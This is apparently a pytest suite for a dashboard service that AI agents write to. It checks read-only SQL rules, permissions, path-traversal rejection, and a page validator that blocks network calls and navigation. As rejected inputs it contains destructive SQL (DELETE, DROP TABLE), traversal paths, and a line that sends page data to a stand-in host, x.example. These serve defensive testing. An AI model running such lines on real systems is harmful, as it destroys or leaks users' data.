"""Contrato 2 (tipo Dashboard): reglas forzadas del almacén, filtros y fuentes."""

import asyncio
import json

import pytest

from agent_dashboards import config
from agent_dashboards.artifacts.dashboard import DashboardService, DashError, DashStore
from agent_dashboards.artifacts.validator import check_page
from agent_dashboards.warehouse import sql_guard
from agent_dashboards.warehouse.mcp_client import QueryResult

TABLE = "`proj.ds.ventas`"
BQ = {"connector": "Google Cloud BigQuery", "tool": "execute_sql_readonly"}


class FakeWarehouse:
    def __init__(self):
        self.sql: list[str] = []

    async def dry_run(self, sql):
        return 1024

    async def run_query(self, sql, **_):
        self.sql.append(sql)
        return QueryResult(columns=[{"name": "dia", "type": "DATE"}, {"name": "total", "type": "INTEGER"}],
                           rows=[{"dia": "2026-01-01", "total": 10}], total_rows=1, bytes_processed=2048)

    async def call_tool(self, name, args):
        return {"tool": name, "args": args}


@pytest.fixture
def svc(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "WAREHOUSE_DATASETS", ["proj.ds"])
    return DashboardService(DashStore(tmp_path), warehouse=FakeWarehouse())


@pytest.fixture
def aid(svc):
    return svc.store.create("Ventas", "lucia")


def query(sql):
    return {"kind": "query", **BQ, "args": {"query": sql}}


def ds(sql, **extra):
    return {"title": "Ventas por día", "description": "Ventas. Reads proj.ds.ventas.", "source": query(sql), **extra}


def test_batch_writes_and_validates_everything_first(svc, aid):
    bad = [
        {"op": "set", "collection": "datasets", "doc_id": "ok", "data": ds(f"SELECT 1 FROM {TABLE}")},
        {"op": "set", "collection": "datasets", "doc_id": "bad", "data": ds(f"DELETE FROM {TABLE} WHERE TRUE")},
    ]
    with pytest.raises(DashError):
        svc.write(aid, "lucia", bad)
    # Nada quedó escrito: el lote se valida entero antes de escribir.
    assert svc.store.get(aid, "datasets", "ok") is None


def test_only_editors_write(svc, aid):
    meta = {"op": "set", "collection": "dash", "doc_id": "meta", "data": {"title": "x"}}
    # Quien no lo puede ver ni se entera de que existe.
    with pytest.raises(DashError, match="No existe"):
        svc.write(aid, "otra", [meta])
    # Quien lo ve (por ejemplo, viewer de su proyecto) no escribe.
    svc.can_view = lambda p, user: True
    with pytest.raises(DashError, match="editores"):
        svc.write(aid, "otra", [meta])


def test_tool_whitelist_and_forbidden_words(svc, aid):
    other = {"title": "x", "source": {"kind": "query", "connector": "Google Cloud BigQuery", "tool": "execute_sql", "args": {"query": "SELECT 1"}}}
    with pytest.raises(DashError, match="execute_sql_readonly"):
        svc.write(aid, "lucia", [{"op": "set", "collection": "datasets", "doc_id": "x", "data": other}])
    with pytest.raises(DashError, match="SET"):
        svc.write(aid, "lucia", [{"op": "set", "collection": "datasets", "doc_id": "x", "data": ds(f"SELECT a FROM {TABLE} WHERE b = 1 SET")}])
    # Una columna que se llama como una palabra prohibida va entre backticks.
    svc.write(aid, "lucia", [{"op": "set", "collection": "datasets", "doc_id": "x", "data": ds(f"SELECT `set` FROM {TABLE}")}])


def test_limits(svc, aid):
    with pytest.raises(DashError, match="256 KB"):
        svc.write(aid, "lucia", [{"op": "set", "collection": "files", "doc_id": "index.html", "data": {"text": "x" * 300_000}}])
    with pytest.raises(DashError, match="50"):
        svc.write(aid, "lucia", [{"op": "set", "collection": "dash", "doc_id": "meta", "data": {"title": "t"}}] * 51)
    with pytest.raises(sql_guard.SqlGuardError, match="16000"):
        sql_guard.check_sql_v2("SELECT " + "1," * 9000 + "1")


def test_update_merges_and_null_removes(svc, aid):
    svc.write(aid, "lucia", [{"op": "set", "collection": "datasets", "doc_id": "d", "data": ds(f"SELECT 1 FROM {TABLE}", schedule="diario")}])
    svc.write(aid, "lucia", [{"op": "update", "collection": "datasets", "doc_id": "d", "data": {"title": "Nuevo", "schedule": None}}])
    doc = svc.store.get(aid, "datasets", "d")
    assert doc["title"] == "Nuevo" and "schedule" not in doc and doc["source"]["kind"] == "query"


def test_params_fill_one_literal():
    args = {"query": "SELECT * FROM t WHERE (CAST({{region}} AS STRING) IS NULL OR region = CAST({{region}} AS STRING)) AND plan IN {{plans}} AND n > {{n}}"}
    out = sql_guard.render_args_v2(args, {"region": "O'Brien", "plans": ["pro", "max"], "n": 3}, "query")["query"]
    assert "'O\\'Brien'" in out and "('pro', 'max')" in out and "n > 3" in out
    empty = sql_guard.render_args_v2(args, {"plans": []}, "query")["query"]
    assert "CAST(NULL AS STRING)" in empty and "IN (NULL)" in empty
    with pytest.raises(sql_guard.SqlGuardError):
        sql_guard.render_args_v2({"query": "SELECT * FROM t WHERE name LIKE '%{{q}}%'"}, {"q": "x"}, "query")
    # Fuera del SQL: un argumento entero es el valor tipado; dentro de otro texto, texto plano.
    other = sql_guard.render_args_v2({"query": "SELECT 1", "values": "{{plans}}", "label": "plan {{p}}"}, {"plans": ["a"], "p": "x"}, "query")
    assert other["values"] == ["a"] and other["label"] == "plan x"


def test_live_load_uses_defaults_and_caches(svc, aid):
    sql = f"SELECT dia, total FROM {TABLE} WHERE (CAST({{{{region}}}} AS STRING) IS NULL OR region = CAST({{{{region}}}} AS STRING))"
    svc.write(aid, "lucia", [
        {"op": "set", "collection": "dash", "doc_id": "params", "data": {"region": "norte"}},
        {"op": "set", "collection": "datasets", "doc_id": "daily", "data": ds(sql)},
    ])
    out = asyncio.run(svc.load(aid, "daily", {}, user="lucia"))
    assert out["data"] == [{"dia": "2026-01-01", "total": 10}] and out["columns"] == ["dia", "total"]
    assert "'norte'" in svc.warehouse.sql[-1]
    asyncio.run(svc.load(aid, "daily", {}, user="lucia"))
    assert len(svc.warehouse.sql) == 1  # caché
    asyncio.run(svc.load(aid, "daily", {"region": "sur"}, user="lucia"))
    assert "'sur'" in svc.warehouse.sql[-1]
    raw = asyncio.run(svc.load(aid, "daily", {}, raw=True, user="lucia"))
    assert raw["answer"]["schema"]["fields"][0]["name"] == "dia" and "data" not in raw


def test_file_source_and_paused_query(svc, aid):
    up = svc.store.put_asset(aid, "ventas.csv", b"dia,total\n2026-01-01,10\n")
    svc.write(aid, "lucia", [{"op": "set", "collection": "datasets", "doc_id": "f", "data": {
        "title": "Archivo", "source": {"kind": "file", **up}, "updated": {"at": "2026-10-01T00:00:00Z", "by": "Lucía"},
        "request": {**BQ, "args": {"query": f"SELECT dia, total FROM {TABLE}"}}, "staleAfterHours": 48}}])
    out = asyncio.run(svc.load(aid, "f", {}, user="lucia"))
    assert out["data"] == [{"dia": "2026-01-01", "total": "10"}] and out["stale"] is True
    svc.resume_source(aid, "lucia", "f")
    live = svc.store.get(aid, "datasets", "f")
    assert live["source"]["kind"] == "query" and "request" not in live and "updated" not in live


def test_paused_query_with_filter_is_flagged(svc, aid):
    up = svc.store.put_asset(aid, "x.json", b"[]")
    res = svc.write(aid, "lucia", [{"op": "set", "collection": "datasets", "doc_id": "f", "data": {
        "title": "Archivo", "source": {"kind": "file", **up}, "updated": {"at": "2026-10-01T00:00:00Z", "by": "c"},
        "request": {**BQ, "args": {"query": f"SELECT 1 FROM {TABLE} WHERE x = CAST({{{{r}}}} AS STRING)"}}}}])
    assert any("filtro" in w for w in res["warnings"])
    with pytest.raises(DashError, match="filtro"):
        asyncio.run(svc.load(aid, "f", {}, user="lucia"))


def test_aux_tools_whitelisted(svc, aid):
    svc.write(aid, "lucia", [{"op": "set", "collection": "datasets", "doc_id": "d", "data": ds(f"SELECT 1 FROM {TABLE}")}])
    out = asyncio.run(svc.run_aux(aid, "d", "get_query_results", {"jobId": "j"}, user="lucia"))
    assert out["args"]["projectId"] == config.WAREHOUSE_PROJECT
    with pytest.raises(DashError):
        asyncio.run(svc.run_aux(aid, "d", "execute_sql", {"query": "DROP TABLE x"}, user="lucia"))
    # La página no elige el SQL: ni siquiera una consulta de solo lectura sobre datos habilitados.
    with pytest.raises(DashError, match="no permitida"):
        asyncio.run(svc.run_aux(aid, "d", "execute_sql_readonly", {"query": f"SELECT * FROM {TABLE}"}, user="lucia"))


def test_history_and_restore(svc, aid):
    svc.write(aid, "lucia", [{"op": "set", "collection": "datasets", "doc_id": "d", "data": ds(f"SELECT 1 FROM {TABLE}")}])
    svc.save_source(aid, "lucia", "d", {"query": f"SELECT 2 FROM {TABLE}"})
    versions = svc.source_versions(aid, "d", "lucia")
    assert versions and "SELECT 1" in versions[0]["data"]["source"]["args"]["query"]
    svc.restore_source(aid, "lucia", "d", versions[0]["version"])
    assert "SELECT 1" in svc.store.get(aid, "datasets", "d")["source"]["args"]["query"]


def test_runs_doc_is_per_reader_and_not_writable_by_agent(svc, aid):
    svc.can_view = lambda p, user: True  # el lector ve el dashboard (por ejemplo, desde su proyecto)
    svc.put_runs(aid, "lector", {"params": {}, "datasets": {"d": {"status": "failed", "message": "x"}}, "marks": [{}] * 30})
    assert len(svc.read(aid, "data/users/me", "runs", "lector")["marks"]) == 20
    assert svc.read(aid, "data/users/me", "runs", "lucia") is None
    # Nadie lee el documento de otro lector, aunque vea el mismo dashboard.
    for ajeno in ("data/users/lector", "data/users", "data", "/data/users/lector/"):
        with pytest.raises(DashError, match="propio documento"):
            svc.read(aid, ajeno, "runs" if ajeno.endswith("lector") else None, "lucia")
    assert svc.read(aid, "data/users/lector", "runs", "lector") is not None
    with pytest.raises(DashError):
        svc.write(aid, "lucia", [{"op": "set", "collection": "data/users/lucia", "doc_id": "runs", "data": {}}])


def test_page_v2_rules():
    page = '<link href="app.css"><div data-source="a b"></div><table data-source="t" data-row-key="region"><tr><th data-field="region">R</th></tr></table><script src="app.js"></script>'
    result = check_page(page, {"a", "b", "t"}, contract=2)
    assert result["errors"] == [] and result["warnings"] == []
    bad = check_page('<script src="https://cdn.x/d3.js"></script><script>fetch("x")</script>', set(), contract=2)
    assert any("Script externo" in e for e in bad["errors"]) and any("red" in e for e in bad["errors"])
    # Una página no navega a otra dirección (se llevaría lo que muestra en la URL); leer el hash sí.
    for nav in ('location.href = "https://x.example/?d=" + d', "window.location = u", 'location["href"] = u', "location.replace(u)", "open(u)"):
        assert any("navegación" in e for e in check_page(f"<script>{nav}</script>", set(), contract=2)["errors"]), nav
    assert check_page("<script>const n = document.getElementById(location.hash.slice(1));</script>", set(), contract=2)["errors"] == []
    # viewBox está bien en el contrato 2: el SVG lleva width="100%" con viewBox y se redibuja en onData.
    assert check_page('<svg width="100%" viewBox="0 0 10 10"></svg>', set(), contract=2)["warnings"] == []
    # "Últimos 28 días" no es un dato; "12.345" sí.
    assert check_page("<p>Últimos 28 días</p>", set(), contract=2)["warnings"] == []
    assert check_page("<p>Ventas: 12.345</p>", set(), contract=2)["warnings"]


def test_describe_marks_unused(svc, aid):
    svc.write(aid, "lucia", [
        {"op": "set", "collection": "datasets", "doc_id": "usado", "data": ds(f"SELECT 1 FROM {TABLE}")},
        {"op": "set", "collection": "datasets", "doc_id": "suelto", "data": ds(f"SELECT 2 FROM {TABLE}")},
        {"op": "set", "collection": "files", "doc_id": "index.html", "data": {"text": '<p data-source="usado" data-field="x">—</p><script>dash.onData(() => {})</script>'}},
    ])
    d = svc.describe(aid, "lucia")
    assert d["unused"] == ["suelto"] and d["editor"] is True and json.dumps(d)


def test_paths_accept_email_users_but_not_traversal(svc, aid):
    svc.can_view = lambda p, user: True
    svc.put_runs(aid, "ana@empresa.com", {"params": {}, "datasets": {}})
    assert svc.read(aid, "data/users/me", "runs", "ana@empresa.com") is not None
    for bad in ("data/users/..", "../otro", "datasets/."):
        with pytest.raises(DashError, match="Ruta inválida"):
            svc.store.get(aid, bad, "runs")
        with pytest.raises(DashError, match="Ruta inválida"):
            svc.store.list_docs(aid, bad)


def test_writing_a_dashboard_requires_the_skill_loaded():
    from types import SimpleNamespace

    from agent_dashboards.artifacts.dashboard_tools import require_dashboard_skill

    ctx = SimpleNamespace(state={}, agent_name="analista_datos")
    write, read = SimpleNamespace(name="write_db"), SimpleNamespace(name="read_db")
    assert "load_skill" in require_dashboard_skill(write, {}, ctx)["error"]
    assert require_dashboard_skill(read, {}, ctx) is None
    ctx.state["_adk_activated_skill_analista_datos"] = ["dashboard"]
    assert require_dashboard_skill(write, {}, ctx) is None
